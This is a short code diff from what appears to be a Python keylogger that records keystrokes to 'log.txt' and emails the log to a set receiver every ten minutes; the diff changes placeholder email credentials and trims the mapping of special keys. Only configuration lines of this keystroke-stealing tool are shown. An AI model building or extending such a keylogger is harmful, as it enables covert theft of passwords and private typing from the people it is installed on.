@@ -10,13 +10,13 @@ from email.mime.application import MIMEApplication # For File Attachment
 # Email information.
 
 EMAILID = "EMAIL" # REPLACE
-EMAILPASS = "PASSWORD" # REPLACE
-TOEMAIL = "SENDER" # REPLACE
+EMAILPASS = "PASS" # REPLACE
+TOEMAIL = "RECEIVER" # REPLACE
 
 CYCLE = 60 * 10 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
 finished = False # Global Track to see if Log is finished.
-ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' [tab] ', Key.alt: ' [alt] ', Key.shift: ' [shift] ', Key.esc: ' [esc] ', Key.cmd: ' [cmd] '} # Dict Containing Non-alpha keys.
+ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' ', Key.esc: ' [esc] '} # Dict Containing Non-alpha keys.
 
 # Key Press.
 def on_press(key):
